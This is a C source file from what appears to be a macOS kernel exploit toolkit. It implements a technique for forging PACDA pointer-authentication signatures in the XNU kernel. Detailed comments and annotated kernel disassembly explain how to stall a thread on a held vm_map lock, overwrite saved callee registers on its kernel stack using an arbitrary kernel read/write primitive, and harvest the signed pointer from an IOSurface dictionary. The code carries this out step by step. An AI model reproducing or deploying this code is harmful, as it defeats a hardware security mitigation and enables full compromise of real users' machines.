//
//  util_pacda.c
//  xe
//
//  Created by admin on 12/3/21.
//

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "xnu/proc.h"
#include "xnu/thread.h"
#include "util/pacda.h"
#include "util/ptrauth.h"
#include "util/lck_rw.h"
#include "util/dispatch.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/assert.h"
#include "util/log.h"
#include "util/misc.h"
#include "util/asm.h"
#include "iokit/os_dictionary.h"
#include "iokit/io_surface.h"

#include <macos/kernel.h>


///
/// The instance variable `dictionary` of class `OSDictionary` stores the the address
/// of array containing keys and values in the dictionary. This variable is signed using
/// `DA` pointer authentication key
///
/// class OSDictionary : public OSCollection
/// {
///     ...
/// protected:
///     struct dictEntry {
///         OSTaggedPtr<const OSSymbol>        key;
///         OSTaggedPtr<const OSMetaClassBase> value;
/// #if XNU_KERNEL_PRIVATE
///         static int compare(const void *, const void *);
/// #endif
///     };
///     dictEntry    * OS_PTRAUTH_SIGNED_PTR("OSDictionary.dictionary") dictionary;
///     unsigned int   count;
///     unsigned int   capacity;
///     unsigned int   capacityIncrement;
///     ...
/// }
/// 
/// The array pointed by the `dictionary` variable is dynamically allocated as required.
/// When a new value is added to the dictionary using `OSDictionary::setObject`, the method
/// calls `OSDictionary::ensureCapacity` method to allocate a larger `dictionary` array if the
/// dictionary is full
///
/// bool
/// OSDictionary::
/// setObject(const OSSymbol *aKey, const OSMetaClassBase *anObject, bool onlyAdd)
/// {
///     unsigned int i;
///     bool exists;
///
///     if (!anObject || !aKey) {
///         return false;
///     }
///
///     // if the key exists, replace the object
///     ...
///
///     if (exists) {
///         ...
///         return true;
///     }
///
///     // add new key, possibly extending our capacity
///     if (count >= capacity && count >= ensureCapacity(count + 1)) {
///         return false;
///     }
///     ...
///     return true;
/// }
///
/// The method `OSDictionary::ensureCapacity` is responsible for allocating a larger array
/// and copying all the elements from existing array to new array and updating the `dictionary`
/// variable to point to the new array.
///
/// unsigned int
/// OSDictionary::ensureCapacity(unsigned int newCapacity)
/// {
///     dictEntry *newDict;
///     vm_size_t finalCapacity;
///
///     if (newCapacity <= capacity) {
///         return capacity;
///     }
///
///     // round up
///     finalCapacity = (((newCapacity - 1) / capacityIncrement) + 1) * capacityIncrement;
///
///     // integer overflow check
///
///     if (finalCapacity < newCapacity) {
///         return capacity;
///     }
///
///     newDict = kallocp_type_tag_bt(dictEntry, &finalCapacity, Z_WAITOK,
///                 VM_KERN_MEMORY_LIBKERN);
///
///     if (newDict) {
///         // use all of the actual allocation size
///         if (finalCapacity > UINT_MAX) {
///             // failure, too large
///             kfree_type(dictEntry, finalCapacity, newDict);
///             return capacity;
///         }
///
///         os::uninitialized_move(dictionary, dictionary + capacity, newDict);
///         os::uninitialized_value_construct(newDict + capacity, newDict + finalCapacity);
///         os::destroy(dictionary, dictionary + capacity);
///
///         OSCONTAINER_ACCUMSIZE(sizeof(dictEntry) * (finalCapacity - capacity));
///
///         kfree_type(dictEntry, capacity, dictionary);
///         // ***NOTE***: the variable dictionary is resigned when it is assigned to newDict
///         dictionary = newDict;
///         capacity = (unsigned int) finalCapacity;
///     }
///
///     return capacity;
/// }
///
/// As noted in code  snippet above, since the variable `dictionary` is protected using `DA` pointer
/// authentication key, it must be resigned with the address of newly allocated array. The instructions
/// responsible for doing this task in shown below (Decompiled from 21E230/kernel.release.t6000)
///
/// OSDictionary::ensureCapacity (OSDictionary* this, uint newCapacity)
/// ...
/// 0xfffffe00079210fc       mov       x19, x0
/// ...                                                                                     _
/// 0xfffffe0007921154      mov       x8, x19                            |
/// 0xfffffe0007921158      ldr          x16, [x8, #0x20]!             | > Construct modifier for authenticating or
/// 0xfffffe000792115c      mov       x23, x8                            |    signing data pointer `OSDictionary::dictionary`
/// 0xfffffe0007921160      movk     x23, #0xa486, LSL#48  _|
/// ...
/// 0xfffffe00079212c0      ldr          w9, [x19, #0x18]            => Set x9 = `OSDictionary::capacity`
/// 0xfffffe00079212c4      ldr          x8, [x19, #0x20]            =>  Set x9 = `OSDictionary::dictionary`
/// ...                                                                                     _
/// 0xfffffe00079212e0      mov       x16, x8                            |
/// 0xfffffe00079212e4      autda     x16, x23                          |
/// 0xfffffe00079212e8      mov       x17, x16                          |
/// 0xfffffe00079212ec      xpacd    x17                                  | > Authenticate `OSDictionary::dictionary`
/// 0xfffffe00079212f0       cmp       x16, x17                          |
/// 0xfffffe00079212f4       b.eq       0xfffffe00079212fc          |
/// 0xfffffe00079212f8       brk         #0xc472                       _ |
/// 0xfffffe00079212fc       mov       x0, x16                          => Set arg1 = authenticated `OSDictionary::dictionary`
/// ...
/// 0xfffffe000792130c      mov       w8, w9
/// 0xfffffe0007921310      lsl          x2, x8, #0x4                  => Set arg3 = `OSDictionary::count` * sizeof(dictEntry)
/// 0xfffffe0007921314      adrp      x0, -0x1fff8db8000
/// 0xfffffe0007921318      add       x0, x0, #0xa38              =>  Set arg1 = kalloc_type_view
/// 0xfffffe000792131c      bl          kfree_type_var_impl_internal  =>  ***NOTE***: Just before pacda this method is called
/// 0xfffffe0007921320      pacda   x21, x23                        =>  ***NOTE***: x21 and x23 are callee-saved registers
/// 0xfffffe0007921324      str         x21, [x19, #0x20]          => Store the signed newDict to `OSDictionary::dictionary`
/// 0xfffffe0007921328      str         w20, [x19, #0x18]         => Store finalCapacity to `OSDictionary::capacity`
/// 0xfffffe000792132c      mov      x0, x20                          => Set the return value of function to finalCapacity
/// 0xfffffe0007921330      ldp        x29, x30, [sp, #0x40]
/// 0xfffffe0007921334      ldp        x20, x19, [sp, #0x30]
/// 0xfffffe0007921338      ldp        x22, x21, [sp, #0x20]
/// 0xfffffe000792133c      ldp        x24, x23, [sp, #0x10]
/// 0xfffffe0007921340      ldp        x26, x25, [sp], #0x50
/// 0xfffffe0007921344      retab
///
/// As noted in the code snippet above, just before the `pacda` instruction, the method `kfree_type_var_impl_internal`
/// is called to release the old `dictionary` array. The operands of `pacda` instruction are `x21` and `x23`
/// and it signs the data pointer in register `x21` using modifier in `x23` and saves the result to register `x21`.
/// Both `x21` and `x23` are callee-saved registers and callee functions are supposed to save these registers
/// on stack before using them and restore their values from stack before returning. Unlike LR, these
/// registers are saved and restored from stack without any protection.
///
/// This means that if we have a reliable method to modify the values of `x21` and `x23` saved on kernel
/// stack while the method `kfree_type_var_impl_internal` is called, we can sign arbitary pointers
/// with arbitary modifiers and since the signed result is saved to `OSDictionary::dictionary` field,
/// we can easily read the signed value from there.
///
/// The method `kfree_type_var_impl_internal` will call `kfree_ext` to release the memory. If the
/// size of memory is greater than or equal to `kalloc_max_prerounded`, the method `kfree_large` is
/// used to release the allocated memory. The method `kfree_large` will call `kmem_free` when the
/// caller has provided the size of memory to be freed (OSDictionary::ensureCapacity do provide the
/// size of allocated memory as 3rd argument to `kalloc_max_prerounded` which will get passed down
/// to `kfree_large`). The `kmem_free_large` method will cal `vm_map_remove` to remove the memory
/// region from the `vm_map` used during allocation. The `vm_map_remove` will call `vm_map_lock`
/// macro which calls `lck_rw_lock_exclusive` method to acquire exlusive lock on `&map->lock`. Since
/// we have `utils/lck_rw.c` utility for acquring and releasing arbitary read-write locks in kernel memory,
/// we can reliably pause the execution of `vm_map_remove` method and make it wait for `&map->lock`
/// to be released. So now we know we can reliably modify kernel stack, but we have to make sure
/// `x21` an `x23` are restored from kernel stack once we release the `&map->lock`
///
/// The method `kfree_ext` does use `x21 and x23` registers and hence it saves these
/// registers to kernel stack. But it restores their values before calling `kfree_large` method as shown
/// below:
///
/// void kfree_ext(kalloc_heap_t kheap, void* data, vm_size_t size)
/// 0xfffffe00072b81bc      pacibsb                                                  _
/// 0xfffffe00072b81c0      sub         sp, sp, #0x70                            |
/// 0xfffffe00072b81c4      stp          x24, x23, [sp, #0x30]                |
/// 0xfffffe00072b81c8      stp          x22, x21, [sp, #0x40]                | >  Saves the callee-saved registers used
/// 0xfffffe00072b81cc      stp          x20, x19, [sp, #0x50]                |
/// 0xfffffe00072b81d0     stp          x29, x30, [sp, #0x60]                 |
/// 0xfffffe00072b81d4     add         x29, sp, #0x60                        _ |
/// 0xfffffe00072b81d8     mov        x19, x2                                     =>   Saves argument `size` to x19
/// 0xfffffe00072b81dc     mov        x20, x1                                     =>   Saves argument `data` to x20
/// 0xfffffe00072b81e0     mov        x21, x0                                     =>   Saves argument `kheap` to x21
/// ...                                                                                                _
/// 0xfffffe00072b8200     adrp       x8, -0x1fff8ebd000                     |
/// 0xfffffe00072b8204     ldr          x8, [x8, #0xd80]                          | >  Checks if kalloc_max_prerounded <= size
/// 0xfffffe00072b8208     cmp       x8, x19                                        |
/// 0xfffffe00072b820c     b.hi        0xfffffe00072b825c                  _ |
/// ...
/// 0xfffffe00072b8228     mov       x0, x22                                       =>   Sets arg1 = `kheap`
/// 0xfffffe00072b822c     mov       x1, x20                                       =>   Sets arg2 = `data`
/// 0xfffffe00072b8230     mov       x2, x19                                    _ =>   Sets arg3 = `size`
/// 0xfffffe00072b8234     ldp         x29, x30, [sp, #0x60]                 |
/// 0xfffffe00072b8238     ldp         x20, x19, [sp, #0x50]                 |
/// 0xfffffe00072b823c     ldp         x22, x21, [sp, #0x40]                 | > Restores callee-saved registers from stack
/// 0xfffffe00072b8240     ldp         x24, x23, [sp, #0x30]                 |
/// 0xfffffe00072b8244     add       sp, sp, #0x70                           _ |
/// 0xfffffe00072b8248     autibsp                                                     |
/// 0xfffffe00072b824c     eor        x16, x30, x30, LSL#0x1              | >  Authenticates LR
/// 0xfffffe00072b8250     tbz        x16, #0x3e, 0xfffffe00072b8258  |
/// 0xfffffe00072b8254     brk        #0xc471                                   _ |
/// 0xfffffe00072b8258     b           kfree_large                               =>   Branches to kfree_large method
/// ...
///
/// So we cannot change the values of those regisers from stack used by `kfree_ext`. The method
/// `kfree_large` do save x21 on to kernel stack and restores its value from stack only  when the
/// method returns. This allows use to change the value of x21 when `kfree_large` returns by modify
/// the kernel stack used by `kfree_large`
///
/// void kfree_large(kalloc_heap_t kheap, vm_offset_t addr, vm_size_t size)
/// 0xfffffe00072b83f4      pacibsp
/// 0xfffffe00072b83f8      sub         sp, sp, #0x80
/// 0xfffffe00072b83fc      stp          x22, x21, [sp, #0x50]              => x21 saved to kernel stack
/// 0xfffffe00072b8400     stp          x20, x19, [sp, #0x60]
/// 0xfffffe00072b8404     stp          x29, x30, [sp, #0x70]
/// ...
/// 0xfffffe00072b84b4     bl            kmem_free                            => kmem_free method called with branch link instr
/// ...
/// 0xfffffe00072b8614     ldp          x29, x30, [sp, #0x70]
/// 0xfffffe00072b8618     ldp          x20, x19, [sp, #0x60]
/// 0xfffffe00072b861c     ldp          x22, x21, [sp, #0x50]              => x21 restored from kernel stack
/// 0xfffffe00072b8620    add         sp, sp, #0x80
/// 0xfffffe00072b8624    retab
/// ...
///
/// Neither `vm_map_remove` nor `lck_rw_lock_exclusive` use register `x23`. So we cannot control
/// its value by modifying the stacks used by these methods. But the method `lck_rw_lock_exclusive_gen`
/// called by `lck_rw_lock_exclusive` do use `x23` register. This method only returns once `vm_map_lock`
/// has acquired the rw lock `map->lock`. So we can control the value of `x23` by modifying the stack
/// used by this method.
///
/// So now since we know we can control values of `x21` and `x23` by modifying kernel stack, we can use
/// this method to sign arbitary pointers with arbitary context using `DA` pointer authentication key.
/// See the implementation below for more details.
///


#define LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET 0x24c
#define KALLOC_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 3 / 16)
#define KERNEL_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 64 / 16)


IOSurfaceRef xe_util_pacda_iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void xe_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, count, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFDictionarySetValue(dict, key, kCFBooleanTrue);
        CFRelease(key);
    }
    IOSurfaceSetValues(surface, dict);
    CFRelease(dict);
}

/// This is a faster method to grow the size of `OSDictionary::dictionary` array
/// than growing by adding values using `IOSurfaceSetValue` method
void xe_util_pacda_prepare_dict_for_switch(IOSurfaceRef surface, uintptr_t dict, uint32_t desired_capacity) {
    xe_assert_cond((desired_capacity * 16) % XE_PAGE_SIZE, ==, 0);
    uint32_t current_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    uint32_t current_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(desired_capacity, >, current_capacity);
    
    /// Update the `OSDictionary::count` to `OSDictionary::capacity - 1`
    /// This will make sure that adding one more unique key to the dictionary will require
    /// growing the `dictionary` array
    int diff = current_capacity - current_count;
    xe_util_pacda_io_surface_add_values(surface, current_count, diff);
    
    /// Set the `OSDictionary::capacityIncrement` value to desired capacity. This value is
    /// used by `OSDictionary::ensureCapacity` to calculate the capacity of new `dictionary` array
    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, desired_capacity);
}


void xe_util_pacda_prepare_surface_for_switch(IOSurfaceRef surface_ref, uintptr_t surface) {
    uintptr_t dict = xe_kmem_read_ptr(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    
    /// Update the `props` dictionary of IOSurface to make it array `OSDictionary::dictionary`
    /// large enough to be allocated from `KHEAP_DEFAULT->kh_large_map`
    xe_util_pacda_prepare_dict_for_switch(surface_ref, dict, KALLOC_MAP_SWITCH_CAPACITY);
    uint32_t count = xe_kmem_read_uint32(dict, TYPE_OS_ARRAY_MEM_COUNT_OFFSET);
    xe_util_pacda_io_surface_add_values(surface_ref, count, 1);
    
    /// Update the `props` dictionary of IOSurface such that adding one more unique key
    /// to the dictionary will lead to allocation of array `OSDictionary::dictionary` from
    /// `KHEAP_DEFAULT->kh_fallback_map`
    xe_util_pacda_prepare_dict_for_switch(surface_ref, dict, KERNEL_MAP_SWITCH_CAPACITY);
}

void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
    IOSurfaceDecrementUseCount(surface);
}

uintptr_t xe_util_pacda_find_ptr(uintptr_t base, char* data, size_t data_size, uintptr_t ptr, uintptr_t mask) {
    uintptr_t* values = (uintptr_t*)data;
    size_t count = data_size / sizeof(uintptr_t);
    
    for (size_t i=0; i<count; i++) {
        if ((values[i] | mask) == ptr) {
            return base + i * sizeof(uintptr_t);
        }
    }
    
    return 0;
}

uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
    uintptr_t machine = thread + TYPE_THREAD_MEM_MACHINE_OFFSET;
    uintptr_t kstackptr = xe_kmem_read_uint64(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
    return kstackptr;
}

uintptr_t xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
    uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
    xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
    
    xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
    
    uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kalloc_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
    uintptr_t kalloc_map_lck = kalloc_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
    
    xe_util_lck_rw_t util_lck_rw = NULL;
    
    /// STEP 1: Allocate a new IOSurface. We will be using the `props` dictionary
    /// used by IOSurface to store values provided by `IOSurfaceSetValue` to sign
    /// pointers using method discussed above.
    uintptr_t surface;
    IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
    
    /// STEP 2: Adjust the capacity of the `props` dictionary such that adding one
    /// more unique key to it will lead to allocation of a new `OSDictionary::dictionary`
    /// array from `KHEAP_DEFAULT.kh_fallback_map` and release of old
    /// `OSDictionary::dictionary` array allocated from `KHEAP_DEFAULT.kh_large_map`
    /// by `OSDictionary::ensureCapacity` method
    ///
    /// This is required because both allocation and free of memory from vm_map
    /// will require acquiring its rw lock `map->lock`. Since we want to pause the
    /// execution of `kfree_type` and not `kallocp_type_tag_bt` we want both methods
    /// to use different `vm_map` for release / allocation.
    xe_util_pacda_prepare_surface_for_switch(surface_ref, surface);
    
    /// STEP 3: Acquire exclusive lock on `KHEAP_DEFAULT.kh_large_map`
    util_lck_rw = xe_util_lck_rw_lock_exclusive(kalloc_map_lck);
    
    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
    dispatch_semaphore_t sem_add_value_start = dispatch_semaphore_create(0);
    dispatch_semaphore_t sem_add_value_complete = dispatch_semaphore_create(0);
    
    /// STEP 4: Add one more unique key `props` dictionary in separate background
    /// thread. This thread will be kept blocked until lock acquired in STEP 3 is released
    dispatch_async(xe_dispatch_queue(), ^() {
        *waiting_thread = xe_xnu_thread_current_thread();
        dispatch_semaphore_signal(sem_add_value_start);
        /// This call will lead to triggering of `OSDictionary::ensureCapacity` method in
        /// IOSurface props dictionary. The method will first allocate a new array from
        /// `KHEAP_DEFAULT.kh_fallback_map`. Then it will copy all the keys and values
        /// from existing `OSDictionary::dictionary` array to the newly allocated array. Then
        /// it will try to release the old `OSDictionary::dictionary` array. Since the old array
        /// is allocated from `KHEAP_DEFAULT.kh_large_map` and the since we have
        /// acquired the lock of this `vm_map` in STEP 3, this method will be blocked until
        /// the lock aquired in STEP 3 is released
        xe_util_pacda_io_surface_add_values(surface_ref, KERNEL_MAP_SWITCH_CAPACITY - 1, 1);
        dispatch_semaphore_signal(sem_add_value_complete);
    });
    
    dispatch_semaphore_wait(sem_add_value_start, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_add_value_start);
    
    
    /// STEP 5: Wait until the background thread created in STEP 4 tries to acquire the
    /// rw lock `KHEAP_DEFAULT.kh_large_map->lock`
    uintptr_t lr_lck_rw_excl_gen_stack_ptr;
    /// This method also sets the value of `lr_lck_rw_excl_gen_stack_ptr` to location in
    /// waiting thread kernel stack where the link register for branch with link call to
    /// `lck_rw_lock_exclusive_gen` method from `lck_rw_lock_exclusive` method is stored
    int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 0, &lr_lck_rw_excl_gen_stack_ptr);
    xe_assert_err(error);
    
    /// STEP 6: Scan the kernel stack of background thread created in STEP 4 to find the
    /// location where link register for branch with link call to `kfree_type_var_impl_internal`
    /// method from `OSDictionary::ensureCapacity` method is stored
    uintptr_t lr_kfree_stack_ptr;
    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XE_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
    xe_assert_err(error);
    
    uintptr_t x19 = lr_kfree_stack_ptr - 0x10; // dict
    uintptr_t x20 = x19 - 0x8; // pacda ptr
    uintptr_t x21 = x20 - 0x8; // dict capacity
    uintptr_t x23 = lr_lck_rw_excl_gen_stack_ptr - 0x30; // pacda ctx

    uintptr_t dict = xe_kmem_read_uint64(x19, 0);
    
    /// STEP 7: Modify the kernel stack to set the values of x23 to required PACDA modifier
    /// and x21 to required PACDA data pointer
    xe_kmem_write_uint64(x23, 0, ctx);
    xe_kmem_write_uint64(x21, 0, ptr);
    
    /// STEP 8: Modify the kernel stack to set the value of x20 to zero. The x20 register stores
    /// the updated capacity of `props` dictionary and this values is returned by `ensureCapacity`
    /// method. Setting this value to zero makes sure that the pointer in `OSDictionary::dictionary`
    /// will not be used by caller `OSDictionary::setObject` when `ensureCapacity` returns
    /// (Using it panic sinces its value is invalid due to modified x21 and x23)
    xe_kmem_write_uint64(x20, 0, 0);
    
    /// STEP 9: Release the lock acquired in STEP 3. This will unblock the background thread
    /// used in STEP 4 and the value of `OSDictionary::dictionary` will have the required PACDA
    /// signed value
    xe_util_lck_rw_lock_done(&util_lck_rw);
    dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_add_value_complete);
    
    /// STEP 10: Read the PACDA signed value from `OSDictionary::dictionary` of IOSurface
    /// props dictionary
    uintptr_t signed_ptr = xe_kmem_read_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET);
    
    /// Reset the props dictionary
    xe_kmem_write_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET, 0);
    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    
    /// Cleanup
    xe_util_pacda_io_surface_destroy(surface_ref);
    
    xe_log_debug("signed ptr %p, result: %p", (void*)ptr, (void*)signed_ptr);
    return signed_ptr;
}

uintptr_t xe_util_pacda_sign_with_descriminator(uintptr_t ptr, uintptr_t ctx, uint16_t descriminator) {
    return xe_util_pacda_sign(ptr, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx));
}
